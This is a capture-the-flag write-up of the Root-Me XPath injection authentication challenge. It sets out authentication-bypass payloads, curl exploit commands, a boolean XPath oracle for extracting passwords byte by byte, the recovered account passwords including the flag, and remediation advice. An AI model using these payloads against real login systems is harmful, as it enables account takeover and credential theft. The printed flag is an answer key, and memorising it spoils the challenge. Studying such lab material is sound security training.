# Root-Me — Web-Server / XPath injection - Authentication (ch23)

- **Target:** http://challenge01.root-me.org/web-serveur/ch23/
- **Class:** XPath injection — authentication bypass + record disclosure
- **Author / date:** g0uZ, 27 December 2012
- **Goal:** retrieve the administrator password

## Flag (administrator password)

```
6FkC67ui8njEepIK5Gr2Kwe
```

**Important byte-level caveat.** The value actually stored in the XML is
`6FkC67ui8njEepIK5Gr2Kwe` **plus a trailing newline** — 24 bytes total:

```
visible value : '6FkC67ui8njEepIK5Gr2Kwe'      len 23
stored value  : '6FkC67ui8njEepIK5Gr2Kwe\n'    len 24   <-- XPath string-length == 24
```

Submit the trimmed `6FkC67ui8njEepIK5Gr2Kwe`; if the validation rejects it, the stored form
carries the `\n`. This was proven, not eyeballed — see the exact-match table below.

## Recon

The site is a small "Forum v0.001" with `?action=` routing:

| Route | Content |
|---|---|
| `?action=` | home |
| `?action=members` | member list |
| `?action=login` | login form (POST `username`, `password`) |

`?action=members` leaks the roster:

| Username | Email | Account type |
|---|---|---|
| Steve | steve@jobs.com | subscriber |
| **John** | John@doe.org | **administrator** |
| Eric | ric@ard.biz | subscriber |

So the target account is `John`, and the login form is the injection point.

## The injection

The backend builds an XPath query by string concatenation — something like:

```php
$query = "//user[username='" . $_POST['username'] . "' and password='" . $_POST['password'] . "']";
```

With `username = John' or '1'='1`, the expression becomes:

```xpath
//user[username='John' or '1'='1' and password='x']
```

Because `and` binds tighter than `or`, this parses as
`username='John' or ('1'='1' and password='x')` — the right-hand branch is false, but
`username='John'` alone is enough. The query returns John's node and the page renders his
entire record, **password field included**:

```html
<input type="text"     value="John" disabled />
<input type="password" value="6FkC67ui8njEepIK5Gr2Kwe
" disabled />
Account type : administrator
You can use this password to validate this challenge.
```

This challenge is *not* blind — the record is echoed. (The companion challenge "Blind XPath
injection" is the one that requires character-by-character extraction.)

## Why each probe behaves as it does

The precedence rule explains every observation, which is a good sanity check that the
query shape above is right:

| `username` payload | Resulting predicate | Result |
|---|---|---|
| `John` | `username='John' and password='x'` | Wrong credentials |
| `John'` | malformed XPath | Wrong credentials (error swallowed) |
| `John' or '1'='1` | `username='John' or ('1'='1' and password='x')` | **Connected as John** |
| `x' or '1'='1` | `username='x' or ('1'='1' and password='x')` | Wrong credentials |
| `x' or 1=1 or ''='` | `username='x' or 1=1 or (''='' and password='x')` | **Connected as Steve** (first node) |

`x' or 1=1 or ''='` matching Steve rather than John is the tell: a bare `1=1` matches
*every* user, and the app takes the first node in document order. The surgical
`John' or '1'='1` is what pins the result to John.

## Exploit chain

```bash
U="http://challenge01.root-me.org/web-serveur/ch23/?action=login"

# 1. Enumerate the roster (also gives us the admin's username)
curl -s "http://challenge01.root-me.org/web-serveur/ch23/?action=members"
#    -> Steve (subscriber), John (administrator), Eric (subscriber)

# 2. Bypass auth and dump John's record, including the password
curl -s -X POST --data-urlencode "username=John' or '1'='1" \
               --data-urlencode "password=x" "$U"
#    -> Connected as John ... value="6FkC67ui8njEepIK5Gr2Kwe
#       " ... Account type : administrator
```

All three accounts fall to the same trick:

| Target | Payload | Password recovered |
|---|---|---|
| Steve | `Steve' or '1'='1` | `testing123` |
| **John** | `John' or '1'='1` | **`6FkC67ui8njEepIK5Gr2Kwe` (+ `\n`)** |
| Eric | `Eric' or '1'='1` | `sky675` |

Note that Steve's and Eric's passwords are clean; only John's carries the trailing newline.

## Byte-exact verification

The rendered HTML was ambiguous about the newline, so I confirmed it with XPath itself —
`=` in XPath performs an **exact** string comparison, which makes the query a precise
oracle. Injection used for the condition:

```
username = x' or <CONDITION> or '1'='2
```

so the predicate reduces to `<CONDITION>` alone.

| Condition | Result |
|---|---|
| `string-length(//user[username='John']/password)=23` | False |
| `string-length(//user[username='John']/password)=24` | **True** |
| `//user[username='John']/password='6FkC67ui8njEepIK5Gr2Kwe'` | False |
| `//user[username='John']/password='6FkC67ui8njEepIK5Gr2Kwe\n'` | **True** |
| `…'6FkC67ui8njEepIK5Gr2Kwe\n\n'` | False |
| `…'6FkC67ui8njEepIK5Gr2Kwe '` (space) | False |
| `…'6FkC67ui8njEepIK5Gr2Kwe\t'` (tab) | False |
| `substring(//user[username='John']/password,1,5)='6FkC6'` | True |
| `substring(//user[username='John']/password,23,1)='e'` | True |

Length 24, exact value matches only with a single trailing `\n`, and character 23 is the
final `e` — so the 24th byte is exactly one newline. This is the ch15 lesson again: never
paste a flag you have only eyeballed.

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | `John` / `wrong` | reject | `Login Wrong credentials` |
| 2 | `Steve` / `steve` (plausible guess) | reject | `Login Wrong credentials` |
| 3 | `John'` (unbalanced quote) | reject | `Login Wrong credentials` |
| 4 | `x' or '1'='1` (no real user named `x`) | reject — precedence | `Login Wrong credentials` |
| 5 | `John' or '1'='1` | bypass | **Connected as John**, full record |

Control 4 is the sharp one: the same `or '1'='1` idiom that works when the first term is a
real username (`John`) fails when it is not (`x`). That proves the injection is being
evaluated inside the predicate with XPath's precedence rules, rather than the app
short-circuiting on a keyword.

## Root cause

1. **String concatenation into an XPath expression.** `$_POST['username']` and
   `$_POST['password']` are interpolated between quotes with no escaping or
   parameterisation. A single `'` escapes the string literal and the rest is attacker SQL —
   sorry, attacker *XPath*.
2. **The query result is used as an authorisation decision.** The app does not verify that
   the returned node's `username` equals the submitted username; it simply trusts that a
   non-empty result means "authenticated". A predicate that matches a different node (or
   all nodes) therefore authenticates the attacker.
3. **The record is echoed back verbatim, including the password.** Even a correct auth
   decision would be undermined by rendering the credential to the client — this is what
   turns an auth bypass into a disclosure.
4. **Plaintext passwords in the XML store.** No hashing, so disclosure is total.

## Fix

- **Never concatenate input into XPath.** XPath 1.0 has no parameter binding, so the
  correct approach is to **escape the literal** — quote the value and escape both `'` and
  `"` (XPath has no backslash escape; you must use entity references):

  ```php
  function xpath_literal(string $s): string {
      if (!str_contains($s, "'")) return "'$s'";
      if (!str_contains($s, '"')) return "\"$s\"";
      // split on ' and rejoin with concat()
      return "concat(" . implode(", \"'\", ", array_map(
          fn($p) => "'$p'", explode("'", $s))) . ")";
  }

  $q = "//user[username=" . xpath_literal($username)
     . " and password=" . xpath_literal($password) . "]";
  ```

  Better still, move off XPath for authentication. If you must query XML, use a document
  store with real parameter binding (e.g. XML databases with prepared queries), or convert
  the data to a SQL/RDBMS layer where prepared statements exist.

- **Verify the returned identity explicitly.** After a match, assert
  `$node->username === $_POST['username']` before granting a session. Never let "the query
  returned something" mean "authenticated".

- **Do not render credentials.** The login response should never include the password —
  not even a masked input pre-filled with it.

- **Hash passwords** (`password_hash()` / Argon2id) and store a digest, so a disclosure
  yields a hash rather than a working credential. Also normalise/trim on *store*, not on
  read — John's trailing newline is exactly the kind of data hygiene bug that produces
  unenterable credentials.

- Rate-limit and log authentication attempts; an XPath predicate is otherwise a free
  oracle for blind extraction.

## Generalisation

XPath injection is structurally identical to SQL injection, with the same two defences
(bind parameters / escape literals) and the same failure mode (trusting a query result as
an authorisation decision). The recurrences worth grepping for:

- `xpath(`, `DOMXPath::query`, `SimpleXMLElement::xpath`, `lxml` `.xpath()` — any of these
  built with concatenation
- LDAP filters: `(&(uid=$user)(password=$pass))` — same bug, same shape
- JSONPath / OData `$filter`, GraphQL resolvers building raw filters
- Any "does this query return a row?" authentication check, regardless of the query language

Detection heuristic: find the string concatenation, then ask whether the code ever
confirms *which* record matched. If not, an injected predicate that matches anything is a
login.
